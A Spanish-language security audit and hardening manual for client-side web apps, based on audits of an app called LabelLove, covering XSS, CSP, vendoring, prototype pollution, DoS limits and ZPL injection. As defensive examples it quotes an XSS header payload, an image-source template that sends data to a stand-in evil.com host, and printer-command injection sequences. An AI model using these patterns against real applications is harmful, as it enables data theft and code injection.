# Guía de Auditoría y Endurecimiento de Seguridad para Aplicaciones Web
**Manual Metodológico y Lecciones Aprendidas de LabelLove**

---

## 1. Introducción y Filosofía de Seguridad

Esta guía consolida la metodología, hallazgos y remediaciones implementadas a lo largo de las auditorías de seguridad realizadas en **LabelLove**. Su objetivo es funcionar como un **marco de referencia técnico y práctico** para auditar y endurecer aplicaciones web modernas (especialmente aplicaciones ricas del lado del cliente, herramientas de diseño, generadores e interfaces de usuario que manejan datos sensibles).

### El Principio de Defensa en Profundidad (*Defense-in-Depth*)
La seguridad nunca debe depender de una única barrera. Si un atacante elude la sanitización de entradas, la **Política de Seguridad de Contenido (CSP)** debe neutralizar la ejecución; si la CSP tuviera una fisura, el aislamiento de orígenes y la ausencia de APIs salientes deben impedir la exfiltración o el uso de recursos del sistema.

---

## 2. Marco Metodológico de Auditoría

Toda auditoría de seguridad en frontend debe estructurarse en 4 etapas:

1. **Análisis de Fuentes y Sumideros (*Sources & Sinks Analysis*):**
   * **Fuentes (*Sources*):** Cualquier entrada no confiable: `file.name`, datos de archivos CSV/Excel, JSON serializado, parámetros de URL (`window.location`), variables del portapapeles (`clipboardData`), y `localStorage`.
   * **Sumideros (*Sinks*):** Lugares donde los datos se transforman en ejecución o renderizado: `.innerHTML`, `.outerHTML`, `document.write`, `eval()`, `new Function()`, `setTimeout(string)`, `img.src`, `a.href`.
2. **Inspección de Políticas de Recursos (CSP & Cabeceras):**
   * Revisar directivas de scripts, conexiones y medios. Verificar ausencia de `'unsafe-inline'`, `'unsafe-eval'` y comodines como `https:`.
3. **Revisión de Cadena de Suministro (*Supply-Chain*):**
   * Evaluar dependencias externas, presencia de **Subresource Integrity (SRI)** o viabilidad de **Vendoring Local** (eliminar CDNs de terceros).
4. **Resiliencia, Estabilidad y DoS:**
   * Evaluar límites de memoria, manejo de excepciones matemáticas/numéricas y cuotas de archivos antes de su procesamiento.

---

## 3. Pilar 1: Mitigación de Cross-Site Scripting (XSS) y Manejo del DOM

### A. Regla Fundamental
> **Jamás asignar datos variables o entradas de usuario a `.innerHTML` o `document.write`.**

### B. APIs Seguras vs Sumideros Inseguros

| Propósito | ❌ Inseguro / Vulnerable | ✅ Seguro / Recomendado |
| :--- | :--- | :--- |
| **Insertar texto** | `el.innerHTML = userInput;` | `el.textContent = userInput;` |
| **Crear elementos** | `container.innerHTML += '<div>' + name + '</div>';` | `const div = document.createElement('div'); div.textContent = name; container.appendChild(div);` |
| **Mensajes / Toasts** | `toast.innerHTML = '<span>' + msg + '</span>';` | `toast.innerHTML = '<span class="icon"></span><span class="msg"></span>'; toast.querySelector('.msg').textContent = msg;` |
| **Carga de scripts** | `document.write('<script src="...">');` | `const s = document.createElement('script'); s.src = '...'; document.head.appendChild(s);` |

### C. Escape Contextual Estricto
Si por arquitectura es imprescindible generar marcado mediante plantillas de texto (*string templates*), **todo valor dinámico** debe pasar por una función de escape contextual:

```javascript
// Escape para HTML y atributos
function escapeHtml(str) {
  return String(str || '').replace(/[&<>"']/g, (m) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[m]));
}

// Escape para contenido XML o nodos dentro de SVG
function escapeXml(str) {
  return String(str || '').replace(/[&<>"']/g, (m) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;'
  }[m]));
}
```

* **Lección aprendida en LabelLove:** Las cabeceras de columnas (`col`) provenientes de archivos Excel/CSV se interpolaban en `<th>{{ ${col} }}</th>` y `data-col="${col}"` sin escapar. Un encabezado manipulado (`"><img src=x onerror=...>`) ejecutaba código al renderizar la tabla. Se corrigió envolviendo toda interpolación con `escapeHtml(col)`.

---

## 4. Pilar 2: Arquitectura de Content Security Policy (CSP)

La CSP es la barrera más potente del navegador contra inyecciones y *cryptojacking*.

### A. Política Estricta de Máxima Protección (Recomendada)
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com data:;
  img-src 'self' data: blob:;
  connect-src 'self' blob: data:;
  object-src 'none';
  base-uri 'self';
">
```

### B. Análisis de Directivas Críticas

1. **`script-src 'self'` (Sin `'unsafe-inline'` y Sin CDNs abiertas):**
   * Eliminar `'unsafe-inline'` garantiza que si un atacante inyecta una etiqueta `<script>` o un manejador `onload=`, el navegador **se negará a ejecutarlo**.
   * Eliminar dominios abiertos de CDNs (como `https://cdn.jsdelivr.net`) previene técnicas de *CSP Bypass*, donde un atacante carga librerías vulnerables o scripts auxiliares alojados en la misma CDN.
2. **`connect-src 'self' blob: data:` (Anti-Cryptojacking y Anti-Exfiltración):**
   * Impide que cualquier código inyectado abra conexiones WebSockets (`wss://`) o peticiones HTTP (`fetch`/`XHR`) hacia pools de minería de criptomonedas o servidores de mando y control (C2).
3. **`img-src 'self' data: blob:` (Sin comodín `https:`):**
   * Explicado en detalle en el Pilar 4; neutraliza el robo de información a través de peticiones GET automáticas de imágenes.
4. **`object-src 'none'` y `base-uri 'self'`:**
   * Deshabilita plugins anticuados (Flash/Java) e impide que un atacante inyecte etiquetas `<base href="...">` para desviar todas las URLs relativas de los scripts.

---

## 5. Pilar 3: Cadena de Suministro (*Supply-Chain*) y Vendoring Local

### A. Por qué el Vendoring Local supera a las CDNs
1. **Inmunidad ante Ataques a la Cadena de Suministro:** El secuestro de paquetes en npm o el compromiso de una CDN no impacta a la aplicación, pues el código en producción es inmutable y local.
2. **Operación 100% Offline y Confiable:** La aplicación funciona sin conexión a internet, esencial para herramientas de planta, almacén o escritorios aislados.
3. **Eliminación de Latencia y Dependencia DNS:** No hay resolución previa de dominios externos ni demoras en redes restringidas.
4. **Permite una CSP `script-src 'self'` Hermética:** No se requieren permisos de red externos para scripts.

### B. Implementación de Subresource Integrity (SRI)
Si el uso de CDNs externas fuera estrictamente necesario, es **obligatorio** el uso de SRI:
```html
<script 
  src="https://cdn.jsdelivr.net/npm/libreria@1.0.0/dist/lib.min.js" 
  integrity="sha384-H4SH..." 
  crossorigin="anonymous">
</script>
```
* **Cálculo del Hash SRI en Terminal:**
  ```bash
  curl -sL https://url-del-script.js | openssl dgst -sha384 -binary | openssl base64 -A
  ```

---

## 6. Pilar 4: Prevención de Fugas de Información por Canal Lateral

### El Vector de Exfiltración vía Imágenes Dinámicas
Cuando una aplicación permite plantillas con reemplazo de variables (ej. `{{ campo }}`):
```javascript
// ❌ VULNERABILIDAD SILENCIOSA:
let src = template.imageSrc; // Ejemplo: "https://evil.com/log?secret={{ rfc_cliente }}"
src = interpolate(src, record);
img.src = src; // El navegador dispara GET hacia evil.com con los datos confidenciales
```

### Mitigación en 2 Capas:
1. **Capa CSP:** Declarar `img-src 'self' data: blob:;` (sin `https:` abierto). El navegador bloqueará la petición de red hacia dominios remotos.
2. **Capa Lógica (Defensa en Código):** Validar la URL antes de asignarla a la propiedad `.src`:

```javascript
static isSafeImageSrc(src) {
  if (!src || typeof src !== 'string') return false;
  const s = src.trim();
  // Bloquear esquemas ejecutables
  if (/^(javascript|vbscript|data:text\/html):/i.test(s)) return false;
  // Permitir únicamente data URIs de imágenes, blobs y rutas relativas locales
  if (s.startsWith('data:image/') || s.startsWith('blob:') || s.startsWith('./') || s.startsWith('/') || !s.includes('://')) {
    return true;
  }
  // Bloquear URLs HTTP/HTTPS externas por defecto
  return false;
}
```

---

## 7. Pilar 5: Mitigación de Prototype Pollution y Deserialización

### A. La Amenaza
Archivos JSON, documentos de configuración o registros importados de hojas de cálculo pueden contener claves manipuladas como `__proto__`, `constructor` o `prototype`, alterando el prototipo de todos los objetos en el entorno JavaScript.

### B. Por qué NO usar `Object.freeze(Object.prototype)` a ciegas
Durante las auditorías de LabelLove se demostró que librerías legítimas de terceros (como `qrcode` o utilidades heredadas) asignan propiedades como `r.toString = ...` en objetos internos. Congelar el prototipo global genera excepciones de tipo `TypeError` que rompen la aplicación en tiempo de ejecución.

### C. La Solución: Desinfección Profunda en la Deserialización
Limpiar de raíz cualquier estructura entrante antes de procesarla:

```javascript
function stripPollution(obj) {
  if (!obj || typeof obj !== 'object') return obj;
  if (Array.isArray(obj)) {
    return obj.map(item => stripPollution(item));
  }
  const clean = {};
  for (const [key, value] of Object.entries(obj)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue; // Descartar claves peligrosas
    }
    clean[key] = (typeof value === 'object' && value !== null) 
      ? stripPollution(value) 
      : value;
  }
  return clean;
}
```

Adicionalmente, al normalizar columnas de datos (como en hojas de cálculo):
```javascript
if (!clean || clean === 'proto' || clean === '__proto__' || clean === 'constructor' || clean === 'prototype') {
  return `col_${index + 1}`;
}
```

---

## 8. Pilar 6: Validación Estricta de Esquemas y Resiliencia DoS

### A. Límites Numéricos y de Elementos
No asumir nunca que un archivo serializado contiene dimensiones o coordenadas válidas:
```javascript
// Verificar finitud y límites racionales
if (typeof width !== 'number' || !isFinite(width) || width < 10 || width > 1000) {
  throw new Error('Dimensiones inválidas o fuera de límites.');
}

// Limitar cantidad máxima de elementos para evitar saturar el loop de renderizado
if (elements.length > 500) {
  throw new Error('El documento supera el límite de 500 elementos de diseño.');
}
```

### B. Protección contra Errores de Rango (`RangeError`)
En JavaScript, métodos nativos como `Number.prototype.toFixed(digits)` fallan fatalmente si `digits > 100`. En motores de formateo de texto o máscaras numéricas, delimitar siempre los decimales:
```javascript
const decimals = Math.min(20, Math.max(0, rawDecimals));
const formatted = num.toFixed(decimals);
```

### C. Límite de Tamaño de Archivo (*Memory DoS Protection*)
Verificar `file.size` antes de llamar a `file.text()` o `FileReader.readAsArrayBuffer()` para evitar caídas por falta de memoria (*Out of Memory / OOM*):
```javascript
const MAX_DOC_SIZE = 15 * 1024 * 1024; // 15 MB
if (file.size > MAX_DOC_SIZE) {
  throw new Error(`El archivo supera el tamaño máximo permitido (${MAX_DOC_SIZE / (1024 * 1024)} MB).`);
}
```

---

## 9. Pilar 7: Inyección en Protocolos de Hardware (ZPL Injection)

En aplicaciones que generan comandos para impresoras industriales o dispositivos embebidos (Zebra ZPL II, ESC/POS, TSPL):
* **Riesgo:** Un valor de texto malicioso puede incluir caracteres de delimitación de comandos (en ZPL: `^` y `~`), permitiendo forzar el fin de etiqueta (`^XZ`), reconfigurar la memoria de la impresora (`^DF`), reiniciar el dispositivo (`~JR`) o alterar secuencias de impresión.
* **Mitigación Obligatoria:**
  ```javascript
  function escapeZPL(text) {
    if (!text) return '';
    return String(text).replace(/[\^~]/g, ''); // Eliminar delimitadores de comando ZPL
  }
  ```

---

## 10. Pilar 8: Cabeceras de Servidor Web (Infraestructura de Despliegue)

Para complementar la seguridad del cliente, el servidor web (Nginx, Apache, Caddy o Cloudflare) debe emitir las siguientes cabeceras HTTP en todas las respuestas:

```nginx
# Protección contra Clickjacking (no permitir incrustar en iframes)
add_header X-Frame-Options "DENY" always;

# Evitar detección automática de tipo MIME (MIME-sniffing)
add_header X-Content-Type-Options "nosniff" always;

# Política de Referencias estricta
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Restricción de APIs del dispositivo
add_header Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=()" always;

# Forzar HTTPS (HSTS) - Si aplica dominio con SSL
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

---

## 11. Lista de Verificación Rápida de Auditoría (*Checklist*)

Utiliza este checklist para auditar cualquier componente o proyecto web antes de producción:

- [ ] **1. CSP sin `'unsafe-inline'` ni `'unsafe-eval'`:** Los scripts se cargan desde archivos estáticos locales o usan hashes criptográficos.
- [ ] **2. Orígenes CSP Restringidos:** `script-src` es `'self'`; no se permiten comodines (`https:`) ni dominios genéricos de CDNs.
- [ ] **3. Cero `document.write` y Cero `.innerHTML` no sanitizados:** El DOM se manipula vía `textContent` o `createElement`.
- [ ] **4. Dependencias Vendoreadas:** Las librerías esenciales están guardadas localmente en `/vendor/`.
- [ ] **5. Restricción de `img-src`:** No se permiten imágenes remotas arbitrarias si las URLs interpolan datos privados.
- [ ] **6. Escape de Caracteres en Marcado Dinámico:** Toda plantilla utiliza `escapeHtml()` o `escapeXml()`.
- [ ] **7. Protección contra Prototype Pollution:** Los objetos JSON entrantes son limpiados con `stripPollution()`.
- [ ] **8. Palabras Reservadas Filtradas:** Propiedades como `__proto__`, `constructor` y `prototype` son rechazadas o renombradas en datasets.
- [ ] **9. Validación de Límites Numéricos y DoS:** Se verifican rangos en dimensiones, coordenadas y conteo de elementos.
- [ ] **10. Protección de Operaciones Matemáticas:** Decimales en `toFixed()` acotados a un rango de 0 a 20.
- [ ] **11. Límites de Tamaño en Archivos:** Se verifica `file.size` antes de leer el buffer completo en memoria.
- [ ] **12. Sanitización en Protocolos de Hardware:** Códigos ZPL/ESC-POS limpian caracteres de control antes del envío.
- [ ] **13. Tolerancia a Fallos en Almacenamiento Local:** Las lecturas de `localStorage` manejan excepciones y verifican existencia previa de propiedades (`optional chaining`).
- [ ] **14. Bloqueo de Conexiones No Autorizadas:** `connect-src 'self' blob: data:` neutraliza minería (*cryptojacking*) o telemetría indebida.
- [ ] **15. Cabeceras de Servidor:** `X-Frame-Options`, `X-Content-Type-Options` y `Referrer-Policy` activas.
